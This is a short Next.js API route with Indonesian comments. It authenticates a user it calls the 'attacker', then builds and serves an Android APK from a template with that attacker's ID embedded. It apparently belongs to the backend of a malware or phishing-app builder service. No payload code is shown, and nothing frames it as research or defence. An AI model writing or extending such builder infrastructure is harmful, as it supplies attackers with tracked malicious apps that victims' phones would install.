import { NextRequest, NextResponse } from "next/server";
import { buildApkWithAttackerId } from "@/lib/apk-builder";
import { getServerSession } from "next-auth"; // atau custom auth

export async function POST(req: NextRequest) {
  const session = await getServerSession(); // Ambil user ID yang sedang login
  if (!session?.user?.id) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });

  const { templateId } = await req.json();
  const attackerId = session.user.id; // ID unik attacker dari DB

  try {
    const { downloadUrl, apkFileName } = await buildApkWithAttackerId(templateId, attackerId);
    // Simpan record generation ke Firestore
    // ...
    return NextResponse.json({ success: true, downloadUrl });
  } catch (error) {
    return NextResponse.json({ error: "APK build failed" }, { status: 500 });
  }
}
